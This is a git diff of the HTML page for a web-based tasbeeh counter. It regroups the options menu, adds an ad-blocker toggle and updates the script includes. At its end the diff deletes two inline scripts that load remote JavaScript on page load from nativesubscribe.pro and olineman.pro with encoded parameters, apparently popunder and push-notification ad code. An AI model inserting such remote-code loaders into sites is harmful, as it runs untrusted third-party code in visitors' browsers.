@@ -2,13 +2,18 @@
 <html>
 
 <head>
+	<!-- Meta Tags -->
 	<meta name="google-site-verification" content="wsixYMH3ANC2FcNqlvFDrvn521DdrJZol0jEWappcsI" />
 	<meta name="keywords" content="tasbeeh, real tasbeeh, online, easy, tally, quran, allah, Tasbeh, tasbih, digital tasbeeh,  تَـسْـبِـيْـح  , islam" />
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="decription" content="online digital tasbeeh">
 	<meta content="width=device-width, initial-scale=1" name="viewport" />
+	<meta name="theme-color" content="#FFA000">
+
 	<title>Tasbeeh Counter</title>
+
+	<!-- css -->
 	<link rel="shortcut icon" type="image/png" href="includes/icon/tasbeeh.png" />
 	<link rel="stylesheet" href="includes/jquery-ui-1.12.1/jquery-ui.css">
 	<link rel="stylesheet" href="includes/css/style.css">
@@ -56,56 +61,78 @@
 				<button id="options" onclick="options()">Options<span class="arrow"> &#9660;</span></button>
 				<div class="useful-options display">
 					<div class="options">
-						<p class="option-title inline noBorder">Theme</p>
-						<div class="inline options-container">
-							<span>Dark Theme</span>
-							<input type="checkbox" class="switch dark">
+
+						<!-- Ads blocker -->
+						<p class="option-title inline noBorder">Ad Blocker</p>
+						<div class="section-seprate">
+							<div class="inline options-container">
+								<span>Enable</span>
+								<input type="checkbox" class="switch ad-blocker">
+							</div>
 						</div>
 
-						<div class="inline options-container">
-							<span>Blue Theme</span>
-							<input type="checkbox" class="switch blue">
+						<!-- themes -->
+						<p class="option-title inline noBorder">Theme</p>
+						<div class="section-seprate">
+							<div class="inline options-container">
+								<span>Dark Theme</span>
+								<input type="checkbox" class="switch dark">
+							</div>
+
+							<div class="inline options-container">
+								<span>Blue Theme</span>
+								<input type="checkbox" class="switch blue">
+							</div>
+						</div>
+
+						<!-- click effects -->
+						<p class="option-title inline noBorder">Click Effect</p>
+						<div class="section-seprate">
+							<div class="inline options-container">
+								<span>Vibrate</span>
+								<input type="checkbox" class="switch vibrate">
+							</div>
+
+							<div class="inline options-container">
+								<span>Click</span>
+								<input type="checkbox" class="switch beep">
+							</div>
 						</div>
 						
-						<p class="option-title inline noBorder">Click Effect</p>
-						<div class="inline options-container">
-							<span>Vibrate</span>
-							<input type="checkbox" class="switch vibrate">
-						</div>
-
-						<div class="inline options-container">
-							<span>Click</span>
-							<input type="checkbox" class="switch beep">
-						</div>
-
+						<!-- remember dates -->
 						<p class="option-title inline noBorder">Starting/End Date</p>
-						<div class="inline options-container">
-							<input type="input" class="start-date" placeholder="Starting Date">
-						</div>
-						<div class="inline options-container">
-							<div class="start"></div>
-						</div>
+						<div class="section-seprate">
+							<div class="inline options-container">
+								<input type="input" class="start-date" placeholder="Starting Date">
+							</div>
+							<div class="inline options-container">
+								<div class="start"><!-- Starting Date --></div>
+							</div>
 
-						<div class="inline options-container">
-							<input type="input" class="end-date" placeholder="Ending Date">
-						</div>
-						<div class="inline options-container">
-							<div class="end"></div>
-						</div>
+							<div class="inline options-container">
+								<input type="input" class="end-date" placeholder="Ending Date">
+							</div>
+							<div class="inline options-container">
+								<div class="end"><!-- Ending Date --></div>
+							</div>
 
-						<div class="inline options-container">
-							<input type="number" class="duration" placeholder="Duration">
+							<div class="inline options-container">
+								<input type="number" class="duration" placeholder="Duration">
+							</div>
+							<button class="option-green save-memory button">Remember Dates</button>
+							<button class="option-red delete-memory button">Delete Dates</button>
 						</div>
-						<button class="option-green save-memory button">Remember Dates</button>
-						<button class="option-red delete-memory button">Delete Dates</button>
-
+						
+						<!-- Change tasbeeh name -->
 						<p class="option-title inline noBorder">Change Tasbeeh Name</p>
-						<div class="inline options-container">
-							<input type="text" class="brand-name" placeholder="Tasbeeh Counter" 
-							maxlength="17">
+						<div class="section-seprate">
+							<div class="inline options-container">
+								<input type="text" class="brand-name" placeholder="Tasbeeh Counter" 
+								maxlength="17">
+							</div>
+							<button class="option-green save-name button">Save</button>
+							<button class="option-red reset-name button">Reset</button>
 						</div>
-						<button class="option-green save-name button">Save</button>
-						<button class="option-red reset-name button">Reset</button>
 					</div>
 
 					
@@ -202,26 +229,29 @@
 		</footer>
 	</section>
 
+	<!--  Ads  -->
+	<div class="ads"></div>
 
 
 
 	<!--ALL JS SCRIPT-->
 
-
-	<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<!-- CDN's -->
+	<script src="https://code.jquery.com/jquery-2.2.4.js"></script>
 	 <script src="includes/jquery-ui-1.12.1/jquery-ui.js"></script>
 	<script src="https://cdn.rawgit.com/nnattawat/flip/master/dist/jquery.flip.min.js"></script>
 	
+	<!-- Local Scripts -->
 	<script src="includes/js/vibrate.js"></script>
 	<script src="includes/js/tasbeeh-name.js"></script>
+	<script src="includes/js/theme.js"></script>
+	<script src="includes/js/switch.js"></script>
+	<script src="includes/js/ad-blocker.js"></script>	
+	<script src="includes/js/local-storage.js"></script>
 	<script src="includes/js/options.js"></script>
 	<script src="includes/js/target-counter.js"></script>
 	<script src="includes/js/script.js"></script>
-	<script src="includes/js/header.js"></script>
-	<script src="includes/js/theme.js"></script>	
-	<script>(function(d){let s=d.createElement('script');s.async=true;s.src='https://nativesubscribe.pro/code/native.js?h=waWQiOjEwMTUwMjQsInNpZCI6MTAyMDEzMCwid2lkIjozMTY2Niwic3JjIjoyfQ==eyJ';d.head.appendChild(s);})(document);</script>
-	<script>(function(d){let s=d.createElement('script');s.async=true;s.src='https://olineman.pro/code/pops.js?h=waWQiOjEwMTUwMjQsInNpZCI6MTAyMDEzMCwid2lkIjozMTY2OCwic3JjIjoyfQ==eyJ';d.head.appendChild(s);})(document);</script>
-
+	<script src="includes/js/header.js"></script>	
 </body>
 
 </html>
